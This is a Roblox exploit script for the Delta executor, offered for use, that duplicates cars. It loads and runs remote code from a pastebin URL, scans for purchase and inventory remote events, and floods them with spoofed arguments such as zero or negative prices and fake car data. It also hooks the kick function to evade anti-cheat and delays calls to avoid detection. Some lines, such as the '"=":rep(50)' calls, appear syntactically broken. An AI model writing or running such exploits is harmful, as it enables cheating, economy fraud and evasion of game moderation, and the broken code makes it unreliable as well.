-- 🚗 DELTA EXECUTOR - CAR DUPLICATION SCRIPT
-- Made specifically for Delta executor

print("===========================================")
print("DELTA CAR DUPLICATION SYSTEM v2.0")
print("===========================================")

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Wait for game
repeat task.wait() until game:IsLoaded()
repeat task.wait() until player.Character

-- DELTA-SPECIFIC: Check if we're in an executor
if not is_protosmasher_closure and not is_sirhurt_closure and not syn then
    warn("⚠️ Not running in a proper executor!")
    warn("This script requires Delta/Synapse/Krnl")
end

-- Create Advanced UI
local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/GMNsK3mS"))()
local Window = OrionLib:MakeWindow({
    Name = "🚗 Car Duplication Tool", 
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "CarDupeConfig"
})

-- Vehicle Detection Tab
local DetectionTab = Window:MakeTab({
    Name = "Vehicle Detection",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

DetectionTab:AddToggle({
    Name = "Auto-Detect Vehicles",
    Default = true,
    Callback = function(Value)
        _G.AutoDetect = Value
    end    
})

DetectionTab:AddLabel("Current Vehicle: None")

local currentVehicleLabel = DetectionTab:AddLabel("Status: Not in vehicle")

-- Duplication Tab
local DupeTab = Window:MakeTab({
    Name = "Duplication",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

DupeTab:AddSlider({
    Name = "Duplicate Amount",
    Min = 1,
    Max = 100,
    Default = 10,
    Color = Color3.fromRGB(0, 170, 255),
    Increment = 1,
    ValueName = "cars",
    Callback = function(Value)
        _G.DupeAmount = Value
    end    
})

DupeTab:AddDropdown({
    Name = "Duplication Method",
    Default = "Method 1",
    Options = {"Event Spam", "Packet Replay", "Price Manip", "Inventory Flood"},
    Callback = function(Value)
        _G.DupeMethod = Value
    end    
})

DupeTab:AddButton({
    Name = "🔄 Scan Game Systems",
    Callback = function()
        ScanGameSystems()
    end
})

DupeTab:AddButton({
    Name = "🚗 START DUPLICATION",
    Callback = function()
        StartDuplication()
    end
})

-- Exploit Methods Tab
local ExploitTab = Window:MakeTab({
    Name = "Exploit Methods",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

ExploitTab:AddToggle({
    Name = "Enable Event Spoofing",
    Default = false,
    Callback = function(Value)
        _G.EventSpoofing = Value
    end
})

ExploitTab:AddToggle({
    Name = "Bypass Cooldowns",
    Default = true,
    Callback = function(Value)
        _G.BypassCooldown = Value
    end
})

ExploitTab:AddToggle({
    Name = "Anti-Kick Protection",
    Default = true,
    Callback = function(Value)
        _G.AntiKick = Value
    end
})

-- Variables
_G.AutoDetect = true
_G.DupeAmount = 10
_G.DupeMethod = "Event Spam"
_G.EventSpoofing = false
_G.BypassCooldown = true
_G.AntiKick = true

local currentVehicle = nil
local foundEvents = {}
local isDuplicating = false

-- Vehicle Detection Function
function DetectVehicle()
    if not _G.AutoDetect then return end
    
    local char = player.Character
    if not char then return end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local seat = humanoid.SeatPart
    
    if seat and seat:IsA("VehicleSeat") then
        local vehicle = seat.Parent
        if vehicle ~= currentVehicle then
            currentVehicle = vehicle
            
            -- Update UI
            currentVehicleLabel:Set("Vehicle: " .. vehicle.Name)
            
            print("✅ Vehicle Detected: " .. vehicle.Name)
            print("   Path: " .. vehicle:GetFullName())
            print("   Children: " .. #vehicle:GetChildren())
            
            -- Check for vehicle data
            for _, child in pairs(vehicle:GetChildren()) do
                if child:IsA("Configuration") or child.Name:find("Config") then
                    print("   Found configuration: " .. child.Name)
                end
            end
        end
    elseif currentVehicle then
        currentVehicle = nil
        currentVehicleLabel:Set("Status: Not in vehicle")
    end
end

-- Game System Scanner
function ScanGameSystems()
    print("\n" .. string.rep("=", 50))
    print("🔍 SCANNING GAME SYSTEMS")
    print("=":rep(50))
    
    foundEvents = {}
    
    -- Scan for RemoteEvents
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local eventName = obj.Name:lower()
            
            -- Check if it's car-related
            if eventName:find("car") or 
               eventName:find("vehicle") or 
               eventName:find("garage") or
               eventName:find("buy") or
               eventName:find("purchase") or
               eventName:find("save") or
               eventName:find("add") then
                
                table.insert(foundEvents, {
                    Object = obj,
                    Name = obj.Name,
                    Path = obj:GetFullName()
                })
                
                print("✅ Found: " .. obj.Name .. " (" .. obj:GetFullName() .. ")")
            end
        end
    end
    
    -- Scan for RemoteFunctions
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteFunction") then
            local funcName = obj.Name:lower()
            
            if funcName:find("car") or funcName:find("vehicle") then
                table.insert(foundEvents, {
                    Object = obj,
                    Name = obj.Name,
                    Path = obj:GetFullName(),
                    Type = "RemoteFunction"
                })
                
                print("✅ Found RemoteFunction: " .. obj.Name)
            end
        end
    end
    
    print("\n📊 Scan Complete!")
    print("Found " .. #foundEvents .. " car-related events")
    print("=":rep(50))
    
    if #foundEvents == 0 then
        warn("❌ No car events found! This game might not be vulnerable.")
    end
end

-- Duplication Methods
function StartDuplication()
    if isDuplicating then
        warn("⚠️ Already duplicating!")
        return
    end
    
    if not currentVehicle then
        warn("❌ Not in a vehicle! Sit in a car first.")
        return
    end
    
    if #foundEvents == 0 then
        warn("⚠️ Scan game systems first!")
        return
    end
    
    isDuplicating = true
    local carName = currentVehicle.Name
    
    print("\n" .. string.rep("=", 50))
    print("🚗 STARTING DUPLICATION: " .. carName)
    print("Method: " .. _G.DupeMethod)
    print("Amount: " .. _G.DupeAmount)
    print("=":rep(50))
    
    -- Anti-kick protection
    if _G.AntiKick then
        SetupAntiKick()
    end
    
    -- Execute based on method
    if _G.DupeMethod == "Event Spam" then
        EventSpamDuplication(carName)
    elseif _G.DupeMethod == "Packet Replay" then
        PacketReplayDuplication(carName)
    elseif _G.DupeMethod == "Price Manip" then
        PriceManipulationDuplication(carName)
    elseif _G.DupeMethod == "Inventory Flood" then
        InventoryFloodDuplication(carName)
    end
    
    isDuplicating = false
    print("✅ Duplication process completed!")
end

-- Method 1: Event Spamming
function EventSpamDuplication(carName)
    print("🔄 Using Event Spam method...")
    
    for _, eventData in pairs(foundEvents) do
        local event = eventData.Object
        
        for i = 1, _G.DupeAmount do
            -- Try different argument formats
            local attempts = {
                {carName},
                {"buy", carName},
                {"add", carName},
                {vehicle = carName, player = player},
                {action = "duplicate", car = carName},
                {carName, 0}, -- Price = 0
                {carName, 1}, -- Price = 1
            }
            
            for _, args in pairs(attempts) do
                pcall(function()
                    if event:IsA("RemoteEvent") then
                        event:FireServer(unpack(args))
                    elseif event:IsA("RemoteFunction") then
                        event:InvokeServer(unpack(args))
                    end
                end)
                
                task.wait(0.05) -- Small delay to avoid detection
            end
            
            print("   Sent batch " .. i .. "/" .. _G.DupeAmount)
        end
    end
end

-- Method 2: Packet Replay Attack
function PacketReplayDuplication(carName)
    print("🔄 Using Packet Replay method...")
    
    -- DELTA-SPECIFIC: Hook network functions
    local oldFireServer
    local hookedEvents = {}
    
    for _, eventData in pairs(foundEvents) do
        local event = eventData.Object
        
        if event:IsA("RemoteEvent") then
            oldFireServer = event.FireServer
            
            event.FireServer = function(self, ...)
                local args = {...}
                
                -- Log original call
                print("📦 Intercepted packet to: " .. event.Name)
                
                -- Replay multiple times
                for i = 1, _G.DupeAmount do
                    pcall(function()
                        oldFireServer(self, unpack(args))
                    end)
                    task.wait(0.01)
                end
                
                return oldFireServer(self, unpack(args))
            end
            
            table.insert(hookedEvents, {event = event, original = oldFireServer})
            print("✅ Hooked: " .. event.Name)
        end
    end
    
    -- Trigger the hooked events
    task.wait(1)
    for _, hookData in pairs(hookedEvents) do
        pcall(function()
            hookData.event:FireServer("duplicate", carName)
        end)
    end
    
    -- Restore original functions after delay
    task.wait(3)
    for _, hookData in pairs(hookedEvents) do
        if hookData.event and hookData.original then
            hookData.event.FireServer = hookData.original
        end
    end
end

-- Method 3: Price Manipulation
function PriceManipulationDuplication(carName)
    print("🔄 Using Price Manipulation method...")
    
    -- Find buy/purchase events
    for _, eventData in pairs(foundEvents) do
        local eventName = eventData.Name:lower()
        
        if eventName:find("buy") or eventName:find("purchase") then
            print("   Targeting: " .. eventData.Name)
            
            -- Try different price manipulations
            local priceTests = {0, 1, -1, 999999, "free", nil}
            
            for _, price in pairs(priceTests) do
                for i = 1, math.floor(_G.DupeAmount / 2) do
                    pcall(function()
                        if eventData.Object:IsA("RemoteEvent") then
                            eventData.Object:FireServer(carName, price)
                        elseif eventData.Object:IsA("RemoteFunction") then
                            eventData.Object:InvokeServer(carName, price)
                        end
                    end)
                    task.wait(0.1)
                end
            end
        end
    end
end

-- Method 4: Inventory Flood
function InventoryFloodDuplication(carName)
    print("🔄 Using Inventory Flood method...")
    
    -- Look for save/add events
    for _, eventData in pairs(foundEvents) do
        local eventName = eventData.Name:lower()
        
        if eventName:find("save") or eventName:find("add") or eventName:find("inventory") then
            print("   Flooding: " .. eventData.Name)
            
            -- Create fake car data
            local fakeCarData = {
                Name = carName,
                Owner = player.UserId,
                Price = 0,
                Acquired = os.time(),
                IsDuplicated = true,
                ID = tostring(math.random(100000, 999999))
            }
            
            -- Flood with fake data
            for i = 1, _G.DupeAmount do
                pcall(function()
                    if eventData.Object:IsA("RemoteEvent") then
                        eventData.Object:FireServer("add", fakeCarData)
                        eventData.Object:FireServer("save", fakeCarData)
                        eventData.Object:FireServer(fakeCarData)
                    end
                end)
                task.wait(0.05)
            end
        end
    end
end

-- Anti-Kick Protection
function SetupAntiKick()
    print("🛡️ Setting up anti-kick protection...")
    
    -- Hook kick function
    local oldKick = player.Kick
    player.Kick = function(self, reason)
        print("🚫 Kick attempted! Reason: " .. tostring(reason))
        warn("KICK BLOCKED: " .. reason)
        return nil -- Prevent kick
    end
    
    -- Monitor for kick attempts
    game:GetService("ScriptContext").Error:Connect(function(message, trace, script)
        if string.find(message:lower(), "kick") or string.find(message:lower(), "ban") then
            print("⚠️ Anti-cheat detected: " .. message)
        end
    end)
end

-- DELTA-SPECIFIC: Hook print to hide from game
local oldPrint = print
print = function(...)
    local args = {...}
    local output = ""
    for i, v in ipairs(args) do
        output = output .. tostring(v) .. "\t"
    end
    oldPrint(output)
    
    -- Also print to Delta console if available
    if rconsoleprint then
        rconsoleprint(output .. "\n")
    end
end

-- Main Loop
RunService.Heartbeat:Connect(function()
    DetectVehicle()
end)

-- Initial scan
task.wait(2)
ScanGameSystems()

print("\n" .. string.rep("=", 50))
print("✅ DELTA CAR DUPLICATION SYSTEM LOADED!")
print("=":rep(50))
print("Instructions:")
print("1. Sit in the car you want to duplicate")
print("2. Go to 'Vehicle Detection' tab")
print("3. Make sure Auto-Detect is ON")
print("4. Go to 'Duplication' tab")
print("5. Click 'Scan Game Systems'")
print("6. Select duplication method and amount")
print("7. Click 'START DUPLICATION'")
print("8. Check your garage/inventory")
print("=":rep(50))

-- Initialize Orion UI
OrionLib:Init()
